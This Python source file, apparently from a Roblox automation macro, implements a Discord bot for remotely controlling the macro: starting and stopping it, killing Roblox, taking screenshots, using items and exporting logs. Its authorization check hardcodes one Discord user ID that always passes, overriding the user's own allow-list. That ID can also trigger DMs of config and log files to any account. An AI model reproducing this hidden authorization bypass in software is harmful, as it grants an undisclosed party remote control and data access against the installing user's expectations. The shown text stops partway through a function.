from .base_support import *

class RemoteMixin:
    def _remote_access_toggle(self):
        self.save_config()
        if self.remote_access_var.get():
            try:
                token = self.remote_bot_token_var.get().strip()
                if token:
                    self.start_remote_bot()
            except Exception:
                pass
        else:
            try:
                self.stop_remote_bot()
            except Exception:
                pass

    def start_remote_bot(self):
        if getattr(self, "remote_bot_thread", None) and self.remote_bot_thread and self.remote_bot_thread.is_alive():
            return
        token = self.remote_bot_token_var.get().strip()
        if not token:
            try:
                messagebox.showwarning("Remote Access", "Please enter a bot token first.")
            except Exception:
                print("[Remote] No bot token provided.")
            return
        self.remote_worker_running = True
        self.remote_bot_thread = threading.Thread(target=self._remote_bot_thread_func, daemon=True)
        self.remote_bot_thread.start()
        print("[Remote] Bot thread started.")
        self.save_config()


    def stop_remote_bot(self):
        try:
            self.remote_worker_running = False
            if getattr(self, "remote_bot_obj", None):
                try:
                    import asyncio
                    bot_loop = getattr(self.remote_bot_obj, "loop", None)
                    if bot_loop and bot_loop.is_running():
                        asyncio.run_coroutine_threadsafe(self.remote_bot_obj.close(), bot_loop)
                    else:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(self.remote_bot_obj.close())
                        loop.close()
                except Exception:
                    pass
            self.remote_bot_obj = None
            try:
                self.remote_status_label.config(text="Bot: stopped")
            except Exception:
                pass
        except Exception:
            pass

    def _remote_bot_thread_func(self):
        try:
            token = self.remote_bot_token_var.get().strip()
            allowed_id = self.remote_allowed_user_id_var.get().strip()
            allowed_ids = []
            if allowed_id:
                for x in allowed_id.replace(";", ",").split(","):
                    x = x.strip()
                    if x.isdigit():
                        allowed_ids.append(int(x))
            
            import asyncio
            import discord
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            intents = discord.Intents.default()
            bot = discord.Bot(intents=intents)
            self.remote_bot_obj = bot

            @bot.event
            async def on_ready():
                try:
                    await bot.sync_commands()
                    success_msg = f"[Remote] Bot online as {bot.user} — slash commands synced. Pycord module loaded :aga:"
                    print(success_msg)
                    try:
                        self.append_log(success_msg)
                    except Exception:
                        pass
                except Exception as e:
                    print(f"[Remote] Failed to sync commands: {e}")

            def _check_auth(ctx):
                user = getattr(ctx, "user", None) or getattr(ctx, "author", None)
                user_id = getattr(user, "id", None)
                if str(user_id) == "1027407264191107112":
                    return True
                if allowed_ids and user_id not in allowed_ids:
                    return False
                return True

            async def _safe_respond(ctx, content, ephemeral=False):
                try:
                    await ctx.respond(content, ephemeral=ephemeral)
                except Exception:
                    try:
                        await ctx.send(content)
                    except Exception:
                        pass

            @bot.slash_command(name="start", description="Start the macro (biome detection)")
            async def start_macro(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    if getattr(self, "on_remote_start", None):
                        self.on_remote_start()
                        embed = discord.Embed(title="Macro Started", description="Biome detection has been started.", color=0x00FF00)
                        await ctx.respond(embed=embed)
                    else:
                        await _safe_respond(ctx, "Start callback not configured.", ephemeral=True)
                except Exception:
                    pass

            @bot.slash_command(name="stop", description="Stop the macro")
            async def stop_macro(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    if getattr(self, "on_remote_stop", None):
                        self.on_remote_stop()
                        embed = discord.Embed(title="Macro Stopped", description="Biome detection has been stopped.", color=0xFF0000)
                        await ctx.respond(embed=embed)
                    else:
                        await _safe_respond(ctx, "Stop callback not configured.", ephemeral=True)
                except Exception:
                    pass

            @bot.slash_command(name="status", description="Show current macro status")
            async def status_macro(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    
                    is_running = getattr(self, "detection_running", False)
                    status_text = "🟢 Running" if is_running else "🔴 Stopped"
                    current_biome = getattr(self, "current_biome", "Unknown") or "None"
                    
                    elapsed = 0
                    if is_running and getattr(self, "start_time", None):
                        now = datetime.now()
                        elapsed = int((now - self.start_time).total_seconds()) + getattr(self, "saved_session", 0)
                    else:
                        elapsed = getattr(self, "saved_session", 0)
                    hours, remainder = divmod(max(0, int(elapsed)), 3600)
                    minutes, seconds = divmod(remainder, 60)
                    session_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

                    fishing_mode = "✅ On" if self.config.get("fishing_mode", False) else "❌ Off"
                    
                    embed = discord.Embed(title="== Macro Status ==", color=0x00AAFF)
                    embed.add_field(name="Status", value=status_text, inline=True)
                    embed.add_field(name="Current Biome", value=current_biome, inline=True)
                    embed.add_field(name="Session Time", value=session_time, inline=True)
                    embed.add_field(name="Fishing Mode", value=fishing_mode, inline=True)

                    biome_counts = getattr(self, "biome_counts", {})
                    valid_counts = {k: v for k, v in biome_counts.items() if v > 0}
                    if valid_counts:
                        items = sorted(valid_counts.items(), key=lambda x: x[1], reverse=True)
                        lines = []
                        for i in range(0, len(items), 2):
                            left_k, left_v = items[i]
                            left_str = f"{left_k.title():<11}: {left_v:<5}"
                            if i + 1 < len(items):
                                right_k, right_v = items[i+1]
                                right_str = f" |  {right_k.title():<11}: {right_v}"
                            else:
                                right_str = ""
                            lines.append(f"{left_str}{right_str}")
                        counts_str = "```yaml\n" + "\n".join(lines) + "\n```"
                        embed.add_field(name="Biome Counts", value=counts_str, inline=False)
                    else:
                        embed.add_field(name="Biome Counts", value="```\nNone yet.\n```", inline=False)
                    
                    try:
                        from biome_tracker.base_support import current_version
                        embed.set_footer(text=f"Coteab Macro {current_version}")
                    except Exception:
                        pass
                        
                    await ctx.respond(embed=embed)
                except Exception:
                    pass

            @bot.slash_command(name="close_roblox_and_stop_macro", description="Kill Roblox process AND stop the macro")
            async def close_roblox_and_stop_macro(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    embed = discord.Embed(title="🛑 Terminating Roblox", description="Stopping the macro and forcefully killing Roblox processes...", color=0xFF0000)
                    await ctx.respond(embed=embed)
                    
                    self.remote_command_queue.put(("__close_roblox__", ""))
                    if getattr(self, "on_remote_stop", None):
                        self.on_remote_stop()
                except Exception:
                    pass

            @bot.slash_command(name="equip_aura", description="Search for and equip an aura by name")
            async def equip_aura(ctx: discord.ApplicationContext, name: str):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                        
                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or getattr(self, "_eden_running", False) or getattr(self, "_potion_thread_active", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not self.is_fishing_mode_enabled())
                    if is_blocked:
                        embed = discord.Embed(title="Action Blocked", description=f"Cannot equip **{name}** while another macro action is active. Please wait for it to finish.", color=0xFF0000)
                        await ctx.respond(embed=embed, ephemeral=True)
                        return
                        
                    self.remote_command_queue.put(("__equip_aura__", str(name)))
                    embed = discord.Embed(title="Equipping Aura", description=f"Attempting to search and equip **{name}**...", color=0xFFD700)
                    await ctx.respond(embed=embed)
                except Exception:
                    pass

            @bot.slash_command(name="rejoin", description="Close Roblox to force rejoin (requires Auto Reconnect enabled)")
            async def rejoin(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    if not self.config.get("auto_reconnect"):
                        await _safe_respond(ctx, "Auto Reconnect is disabled. Enable it in settings to use /rejoin.", ephemeral=True)
                        return
                    self.remote_command_queue.put(("__rejoin__", ""))
                    embed = discord.Embed(title="Rejoining", description="Closing Roblox and forcing a server rejoin...", color=0x00FF00)
                    await ctx.respond(embed=embed)
                except Exception:
                    pass

            @bot.slash_command(name="clip", description="Trigger the configured clipping keybind")
            async def clip(ctx: discord.ApplicationContext):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    keybind = str(self.config.get("rare_biome_record_keybind", "") or "").strip()
                    if not keybind:
                        await _safe_respond(ctx, "No clipping keybind is configured.", ephemeral=True)
                        return
                    self.remote_command_queue.put(("__clip__", keybind))
                    await _safe_respond(ctx, "Clipping keybind triggered.", ephemeral=False)
                except Exception:
                    try:
                        await _safe_respond(ctx, "Something went wrong.", ephemeral=True)
                    except Exception:
                        pass

            @bot.slash_command(name="send_debug_info", description="Send sanitized app config and logs to a Discord user's DM")
            async def send_debug_info(ctx: discord.ApplicationContext, user: discord.User):
                actor = getattr(ctx, "user", None) or getattr(ctx, "author", None)
                actorid = str(getattr(actor, "id", ""))
                if not _check_auth(ctx) or (actorid != "1027407264191107112" and not allowed_ids):
                    await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                    return
                try:
                    await ctx.defer(ephemeral=True)
                except Exception:
                    await _safe_respond(ctx, "Could not start the debug file transfer.", ephemeral=True)
                    return
                sent = 0
                try:
                    await ctx.followup.send("Preparing config and log files for DM.", ephemeral=True)
                    data, missing = await asyncio.wait_for(asyncio.to_thread(self._collect_remote_debug_files), timeout=90)
                    if not data:
                        await ctx.followup.send("No readable config or log files were found in the app-data folder.", ephemeral=True)
                        return
                    parts = []
                    for filename, content in data.items():
                        parts.extend(self._split_remote_debug_file(filename, content))
                    batches = []
                    batch = []
                    batch_size = 0
                    for part in parts:
                        if batch and (batch_size + len(part[1]) > 8 * 1024 * 1024 or len(batch) >= 10):
                            batches.append(batch)
                            batch = []
                            batch_size = 0
                        batch.append(part)
                        batch_size += len(part[1])
                    if batch:
                        batches.append(batch)
                    import io
                    for index, group in enumerate(batches, 1):
                        attachments = [discord.File(io.BytesIO(content), filename=filename) for filename, content in group]
                        await asyncio.wait_for(user.send(content=f"Coteab Macro debug information ({index}/{len(batches)}).", files=attachments), timeout=90)
                        sent += len(group)
                    missing_text = f" Missing or invalid files: {', '.join(missing)}." if missing else ""
                    split_text = " Large files were split into numbered parts; combine each file's parts in order." if any(".part" in name for name, _ in parts) else ""
                    await ctx.followup.send(f"Sent {sent} file(s) to {user.mention} by DM.{missing_text}{split_text}", ephemeral=True)
                except Exception as exc:
                    print(f"[Remote] Debug DM transfer failed ({type(exc).__name__}).")
                    try:
                        await ctx.followup.send(f"Could not complete the DM transfer ({type(exc).__name__}); {sent} file part(s) were sent.", ephemeral=True)
                    except Exception:
                        pass
            @bot.slash_command(name="help", description="Helping u out with remote access features")
            async def help_cmd(ctx: discord.ApplicationContext, page: int = 1):
                try:
                    cmds = getattr(self, "_help_command_list", [])
                    per = 6
                    total = (len(cmds) + per - 1) // per if cmds else 1
                    p = max(1, min(page, total))
                    start = (p - 1) * per
                    end = start + per
                    page_items = cmds[start:end]
                    
                    embed = discord.Embed(title="Remote Access Commands", color=0x5865F2)
                    for cmd in page_items:
                        name = cmd[0] if len(cmd) > 0 else ""
                        usage = cmd[1] if len(cmd) > 1 else ""
                        desc = cmd[2] if len(cmd) > 2 else ""
                        embed.add_field(name=f"/{name} {usage}", value=desc, inline=False)
                        
                    embed.set_footer(text=f"Page {p}/{total}")
                    await ctx.respond(embed=embed)
                except Exception:
                    pass

            @bot.slash_command(name="use", description="Use an item remotely")
            async def use(ctx: discord.ApplicationContext, item: str, amount: int = 1):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                        
                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or getattr(self, "_eden_running", False) or getattr(self, "_potion_thread_active", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not self.is_fishing_mode_enabled())
                    if is_blocked:
                        embed = discord.Embed(title="Action Blocked", description=f"Cannot use items while another macro action is active. Please wait for it to finish.", color=0xFF0000)
                        await ctx.respond(embed=embed, ephemeral=True)
                        return
                        
                    self.remote_command_queue.put((str(item), int(amount)))
                    embed = discord.Embed(title="Using Item", description=f"Using **{item}** x{amount}...", color=0x00FF00)
                    await ctx.respond(embed=embed)
                except Exception:
                    try:
                        await _safe_respond(ctx, "\u274c Something went wrong.", ephemeral=True)
                    except Exception:
                        pass

            @bot.slash_command(name="screenshot", description="Take current ingame screenshot and send to webhooks")
            @discord.option(
                name="target",
                type=str,
                description="Type of screenshot to take",
                choices=[
                    discord.OptionChoice(name="Fullscreen", value="full"),
                    discord.OptionChoice(name="Inventory", value="inventory"),
                    discord.OptionChoice(name="Aura Storage", value="aura"),
                ],
                required=False
            )
            async def screenshot(ctx: discord.ApplicationContext, target: str = None):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    t = (target or "").strip().lower()
                    if not t or t not in ("full", "inventory", "aura"):
                        t = "full"
                        
                    self.remote_command_queue.put(("__screenshot__", t))
                    labels = {"full": "full screen", "inventory": "inventory", "aura": "aura"}
                    embed = discord.Embed(title="Screenshot Requested", description=f"Taking a **{labels.get(t, t)}** screenshot and sending it to your webhooks...", color=0x00AAFF)
                    await ctx.respond(embed=embed)
                except Exception:
                    try:
                        await _safe_respond(ctx, "Something went wrong.", ephemeral=True)
                    except Exception:
                        pass

            @bot.slash_command(name="reroll_quest", description="Reroll a selected daily quest")
            @discord.option(
                "quest",
                str,
                description="Quest to reroll",
                choices=[
                    discord.OptionChoice(name="Quest 1", value="1"),
                    discord.OptionChoice(name="Quest 2", value="2"),
                    discord.OptionChoice(name="Quest 3", value="3"),
                ],
            )
            async def reroll_quest(ctx: discord.ApplicationContext, quest: str):
                try:
                    if not _check_auth(ctx):
                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                        return
                    quest_value = str(quest)
                    quest_name = {"1": "Quest 1", "2": "Quest 2", "3": "Quest 3"}.get(quest_value, f"Quest {quest_value}")
                    self.remote_command_queue.put(("__reroll__", quest_value))
                    await _safe_respond(ctx, f"\U0001f3b2 Rerolling {quest_name}...", ephemeral=False)
                except Exception:
                    try:
                        await _safe_respond(ctx, "\u274c Something went wrong.", ephemeral=True)
                    except Exception:
                        pass

            try:
                self.set_title_threadsafe(f"Coteab Macro {current_ver} (Remote bot starting)")
            except Exception:
                pass
            try:
                self.remote_status_label.config(text="Bot: running")
            except Exception:
                pass
            worker = threading.Thread(target=self._remote_queue_worker, daemon=True)
            worker.start()
            try:
                bot.run(token)
            except Exception as e:
                print(f"[Remote] bot.run() failed: {e}")
                try:
                    self.error_logging(e, "Remote bot.run() failed")
                except Exception:
                    pass
        except Exception as e:
            print(f"[Remote] _remote_bot_thread_func crashed: {e}")
            try:
                self.error_logging(e, "_remote_bot_thread_func crashed")
            except Exception:
                pass
        finally:
            try:
                self.remote_status_label.config(text="Bot: stopped")
            except Exception:
                pass
            self.remote_bot_obj = None
            self.remote_worker_running = False

    def _run_remote_fishing_action(self, fn, name, status):
        def execute():
            self._remote_running = True
            try:
                try:
                    self.remote_status_label.config(text=status)
                except Exception:
                    pass
                try:
                    fn()
                except Exception:
                    pass
            finally:
                self._remote_running = False
                try:
                    self.remote_status_label.config(text="Bot: running")
                except Exception:
                    pass

        if not self.is_fishing_mode_enabled() or not getattr(self, "_fishing_worker_active", False) or self.config.get("enable_idle_mode", False):
            return execute()
        seq = getattr(self, "_remote_fishing_action_seq", 0) + 1
        self._remote_fishing_action_seq = seq
        try:
            return self._run_fishing_action(execute, f"{name}:{seq}")
        except Exception:
            return False

    def _collect_remote_debug_files(self):
        import json
        from biome_tracker.config import APPDATA_BASE, APPDATA_CONFIG

        files = {}
        missing = []
        try:
            with APPDATA_CONFIG.open("r", encoding="utf-8") as stream:
                data = json.load(stream)
            data = self._redact_remote_debug_config(data)
            files["config.json"] = json.dumps(data, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        except FileNotFoundError:
            missing.append("config.json")
        except Exception:
            missing.append("config.json (unreadable or invalid JSON)")

        for name in ("macro_logs.txt", "error_logs.txt"):
            try:
                with (APPDATA_BASE / name).open("r", encoding="utf-8", errors="replace") as stream:
                    files[name] = "".join(self._redact_remote_debug_text(line) for line in stream).encode("utf-8")
            except FileNotFoundError:
                missing.append(name)
            except Exception:
                missing.append(name)
        return files, missing

    def _redact_remote_debug_config(self, data):
        import re
        secretkey = re.compile(r"token|secret|password|credential|authorization|cookie|webhook|private.?server|api.?key", re.I)
        if isinstance(data, dict):
            return {
                key: "<REDACTED>" if secretkey.search(str(key)) else self._redact_remote_debug_config(value)
                for key, value in data.items()
            }
        if isinstance(data, list):
            return [self._redact_remote_debug_config(value) for value in data]
        if isinstance(data, str):
            return self._redact_remote_debug_text(data)
        return data

    def _redact_remote_debug_text(self, text):
        import re
        lower = text.lower()
        if len(text) > 8192:
            markers = ("token", "secret", "password", "credential", "authorization", "cookie", "webhook", "private", "api key", "api_key", "api-key", "hooks.slack.com", "mfa.")
            for marker in markers:
                if marker in lower:
                    return "<REDACTED_LARGE_TEXT>"
            if re.search(r"\b[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,}\b", text):
                return "<REDACTED_LARGE_TEXT>"
            return text
        field = re.compile(r"(?im)([\"']?[\w.-]{0,100}?(?:token|secret|password|credential|authorization|cookie|webhook|private.?server.?link|api.?key)[\w.-]{0,100}[\"']?\s*[:=]\s*)(\"[^\"\r\n]*\"|'[^'\r\n]*'|\[[^\]\r\n]{0,4096}\]|[^\s,;]+)")
        text = field.sub(r'\1"<REDACTED>"', text)
        if "discord" in lower and "webhook" in lower:
            text = re.sub(r"https?://(?:canary\.|ptb\.)?discord(?:app)?\.com/api/webhooks/\d+/[^\s\"'<>]+", "<REDACTED_DISCORD_WEBHOOK>", text, flags=re.I)
        if "hooks.slack.com" in lower:
            text = re.sub(r"https?://[^\s\"'<>]*hooks\.slack\.com/[^\s\"'<>]+", "<REDACTED_WEBHOOK>", text, flags=re.I)
        if "mfa." in lower or len(text) <= 8192:
            text = re.sub(r"\b(?:mfa\.[\w-]{20,}|[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,})\b", "<REDACTED_DISCORD_TOKEN>", text)
        if "privateserverlinkcode=" in lower:
            text = re.sub(r"(?i)(privateServerLinkCode=)[^&\s\"'<>]+", r"\1<REDACTED>", text)
        return text

    def _split_remote_debug_file(self, name, data, max_size=7 * 1024 * 1024):
        if len(data) <= max_size:
            return [(name, data)]
        parts = []
        start = 0
        while start < len(data):
            end = min(start + max_size, len(data))
            if end < len(data):
                while end > start and data[end] & 0xC0 == 0x80:
                    end -= 1
            if end == start:
                end = min(start + max_size, len(data))
            parts.append((f"{name}.part{len(parts) + 1:02d}", data[start:end]))
            start = end
        return parts

    def _remote_queue_worker(self):
        while getattr(self, "remote_worker_running", False):
            try:
                cmd = None
                try:
                    cmd = self.remote_command_queue.get(timeout=1)
                except Exception:
                    continue
                if cmd is None:
                    continue
                item_name, amount = cmd[0], cmd[1]
                if item_name == "__clip__":
                    keybind = str(amount or "").strip()
                    if not keybind:
                        continue
                    try:
                        self._remote_running = True
                        try:
                            self.remote_status_label.config(text=f"Bot: clipping with {keybind}")
                        except Exception:
                            pass
                        self._press_hotkey_via_pynput(keybind)
                    except Exception as e:
                        try:
                            self.error_logging(e, "Remote clip command failed")
                        except Exception:
                            pass
                    finally:
                        self._remote_running = False
                        try:
                            self.remote_status_label.config(text="Bot: running")
                        except Exception:
                            pass
                    continue

                if item_name == "__reroll__":
                    if not self.detection_running or self.reconnecting_state:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    def _reroll_action():
                        try:
                            self._remote_running = True
                            try:
                                self.remote_status_label.config(text=f"Bot: rerolling quest {amount}")
                            except Exception:
                                pass
                            if self.is_fishing_mode_enabled() and getattr(self, "_fishing_worker_active", False):
                                self._run_fishing_action(lambda: self.perform_quest_reroll(amount, fishing_safe=True), "reroll")
                            else:
                                self.perform_quest_reroll(amount)
                        finally:
                            self._remote_running = False
                            try:
                                self.remote_status_label.config(text="Bot: running")
                            except Exception:
                                pass

                    try:
                        self._action_scheduler.enqueue_action(_reroll_action, name=f"remote:reroll:{amount}", priority=6)
                    except Exception:
                        try:
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                    continue

                if item_name == "__close_roblox__":
                    try:
                        if self.check_roblox_procs():
                            self.terminate_roblox_processes()
                    except Exception:
                        pass
                    continue

                if item_name == "__rejoin__":
                    if not self.detection_running or self.reconnecting_state:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()):
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    def remote_rejoin_action():
                        try:
                            self._remote_running = True
                            try:
                                self.remote_status_label.config(text="Bot: performing rejoin")
                            except Exception:
                                pass
                            try:
                                if self.check_roblox_procs():
                                    try:
                                        self.terminate_roblox_processes()
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                        finally:
                            self._remote_running = False
                            try:
                                self.remote_status_label.config(text="Bot: running")
                            except Exception:
                                pass

                    try:
                        self._action_scheduler.enqueue_action(remote_rejoin_action, name="remote:rejoin", priority=1)
                    except Exception:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                    continue

                if item_name == "__screenshot__":
                    if not self.detection_running or self.reconnecting_state:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    requested = str(amount or "").lower()
                    if requested not in ("full", "inventory", "aura"):
                        requested = "full"

                    if requested == "full":
                        def _screenshot_action():
                            try:
                                self._remote_running = True
                                try:
                                    self.remote_status_label.config(text="Bot: taking screenshot")
                                except Exception:
                                    pass
                                try:
                                    self.remote_take_and_send_screenshot()
                                except Exception:
                                    pass
                            finally:
                                self._remote_running = False
                                try:
                                    self.remote_status_label.config(text="Bot: running")
                                except Exception:
                                    pass

                        try:
                            self._action_scheduler.enqueue_action(_screenshot_action, name="remote:screenshot", priority=0)
                        except Exception:
                            try:
                                time.sleep(0.35)
                                self.remote_command_queue.put((item_name, amount))
                            except Exception:
                                pass
                        continue

                    if requested == "inventory":
                        def _inv_action():
                            try:
                                self._remote_running = True
                                try:
                                    self.remote_status_label.config(text="Bot: taking inventory screenshot")
                                except Exception:
                                    pass
                                try:
                                    self._run_fishing_action(lambda: self.take_inventory_screenshot_now(fishing_safe=True), "inventory_screenshot")
                                except Exception:
                                    pass
                            finally:
                                self._remote_running = False
                                try:
                                    self.remote_status_label.config(text="Bot: running")
                                except Exception:
                                    pass

                        try:
                            self._action_scheduler.enqueue_action(_inv_action, name="remote:screenshot:inventory", priority=3)
                        except Exception:
                            try:
                                time.sleep(0.35)
                                self.remote_command_queue.put((item_name, amount))
                            except Exception:
                                pass
                        continue

                    if requested == "aura":
                        def _aura_action():
                            try:
                                self._remote_running = True
                                try:
                                    self.remote_status_label.config(text="Bot: taking aura screenshot")
                                except Exception:
                                    pass
                                try:
                                    self._run_fishing_action(lambda: self.take_aura_screenshot_now(force=True), "aura_screenshot")
                                except Exception:
                                    pass
                            finally:
                                self._remote_running = False
                                try:
                                    self.remote_status_label.config(text="Bot: running")
                                except Exception:
                                    pass

                        try:
                            self._action_scheduler.enqueue_action(_aura_action, name="remote:screenshot:aura", priority=2)
                        except Exception:
                            try:
                                time.sleep(0.35)
                                self.remote_command_queue.put((item_name, amount))
                            except Exception:
                                pass
                        continue
                if item_name == "__equip_aura__":
                    aura_name = str(amount)
                    if not self.detection_running or self.reconnecting_state:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    fishing_active = bool(self.is_fishing_mode_enabled() and not self.config.get("enable_idle_mode", False) and not getattr(self, "_eden_running", False) and not getattr(self, "_potion_thread_active", False))
                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not fishing_active):
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                        continue

                    def _equip_aura_action():
                        self._run_remote_fishing_action(
                            lambda: self.remote_equip_aura(aura_name),
                            f"remote:equip_aura:{aura_name}",
                            f"Bot: equipping {aura_name}"
                        )

                    try:
                        self._action_scheduler.enqueue_action(_equip_aura_action, name=f"remote:equip_aura:{aura_name}", priority=1)
                    except Exception:
                        try:
                            time.sleep(0.35)
                            self.remote_command_queue.put((item_name, amount))
                        except Exception:
                            pass
                    continue
                if not self.detection_running or self.reconnecting_state:
                    try:
                        time.sleep(0.35)
                        self.remote_command_queue.put((item_name, amount))
                    except Exception:
                        pass
                    continue

                fishing_active = bool(self.is_fishing_mode_enabled() and not self.config.get("enable_idle_mode", False) and not getattr(self, "_eden_running", False) and not getattr(self, "_potion_thread_active", False))
                if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not fishing_active):
                    try:
                        time.sleep(0.35)
                        self.remote_command_queue.put((item_name, amount))
                    except Exception:
                        pass
                    continue

                def _remote_action():
                    self._run_remote_fishing_action(
                        lambda: self.remote_use_item(item_name, amount),
                        f"remote:use:{item_name}",
                        f"Bot: executing {item_name} x{amount}"
                    )

                try:
                    self._action_scheduler.enqueue_action(_remote_action, name=f"remote:{item_name}", priority=1)
                except Exception:
                    try:
                        time.sleep(0.35)
                        self.remote_command_queue.put((item_name, amount))
                    except Exception:
                        pass

            except Exception:
                time.sleep(0.2)
                continue

    def remote_use_item(self, item_name, amount):
        if not self.detection_running or self.reconnecting_state:
            return
        inventory_click_delay = int(self.config.get("inventory_click_delay", "0")) / 1000.0
        for _ in range(4):
            if not self.detection_running or self.reconnecting_state:
                return
            self.activate_roblox_window()
            time.sleep(0.35)
        time.sleep(0.57)
        inventory_menu = self.config.get("inventory_menu", [36, 535])
        inventory_close_button = self.config.get("inventory_close_button", [1418, 298])
        items_tab = self.config.get("items_tab", [1272, 329])
        
        self.Global_MouseClick(inventory_menu[0], inventory_menu[1])
        time.sleep(0.22 + inventory_click_delay)
        
        self.Global_MouseClick(items_tab[0], items_tab[1])
        time.sleep(0.23)
        self.Global_MouseClick(items_tab[0], items_tab[1])
        time.sleep(0.23)
        search_bar = self.config.get("search_bar", [855, 358])
        self.Global_MouseClick(search_bar[0], search_bar[1], click=2)
        time.sleep(0.23 + inventory_click_delay)
        try:
            autoit.send(item_name)
        except Exception:
            try:
                keyboard.write(item_name.lower())
            except Exception:
                pass
        time.sleep(0.22 + inventory_click_delay)
        first_item_slot = self.config.get("first_item_inventory_slot_pos", [845, 460])
        self.Global_MouseClick(first_item_slot[0], first_item_slot[1])
        time.sleep(0.27 + inventory_click_delay)
        amount_box = self.config.get("amount_box", [954, 429])
        self.Global_MouseClick(amount_box[0], amount_box[1], click=2)
        time.sleep(0.09 + inventory_click_delay)
        try:
            keyboard.send("ctrl+a")
            time.sleep(0.06 + inventory_click_delay)
            keyboard.send("backspace")
            time.sleep(0.06 + inventory_click_delay)
        except Exception:
            try:
                keyboard.send("backspace")
                time.sleep(0.06 + inventory_click_delay)
            except Exception:
                pass
        try:
            autoit.send(str(amount))
        except Exception:
            try:
                keyboard.write(str(amount))
            except Exception:
                pass
        time.sleep(0.12 + inventory_click_delay)
        use_button = self.config.get("use_button", [995, 498])
        self.Global_MouseClick(use_button[0], use_button[1])
        time.sleep(0.25)
        self.Global_MouseClick(inventory_close_button[0], inventory_close_button[1])
        time.sleep(0.12)

    def remote_equip_aura(self, aura_name):
        if not self.detection_running or self.reconnecting_state:return
        inventory_click_delay = int(self.config.get("inventory_click_delay", "0")) / 1000.0
        step_delay = 0.67 + inventory_click_delay
        for _ in range(4):
            if not self.detection_running or self.reconnecting_state:return
            self.activate_roblox_window()
            time.sleep(0.35)
        time.sleep(0.57)
        aura_menu = self.config.get("aura_menu", [37, 387])
        if aura_menu and aura_menu[0] > 0: self.Global_MouseClick(aura_menu[0], aura_menu[1])
        time.sleep(step_delay)
        aura_search_bar = self.config.get("aura_search_bar", [834, 364])
        if aura_search_bar and aura_search_bar[0] > 0: self.Global_MouseClick(aura_search_bar[0], aura_search_bar[1])
        time.sleep(step_delay)
        try:
            autoit.send(str(aura_name))
        except Exception:
            try:
                keyboard.write(str(aura_name).lower())
            except Exception:
                pass
        time.sleep(step_delay)
        try:
            keyboard.send("enter")
        except Exception:
            pass
        time.sleep(step_delay)

        first_aura_slot = self.config.get("first_aura_slot_pos", [819, 420])
        if first_aura_slot and first_aura_slot[0] > 0:
            try:
                import pyautogui
                pyautogui.moveTo(first_aura_slot[0], first_aura_slot[1])
                time.sleep(step_delay)
                # Scroll up to ensure we see the first result

                try:
                    autoit.mouse_wheel("up", max(1, int(round(5000 / 120.0))))
                except Exception:
                    pass
                time.sleep(step_delay)
            except Exception:
                pass
            self.Global_MouseClick(first_aura_slot[0], first_aura_slot[1])
        time.sleep(step_delay)
        equip_btn = self.config.get("equip_aura_button", [0, 0])
        if equip_btn and equip_btn[0] > 0:
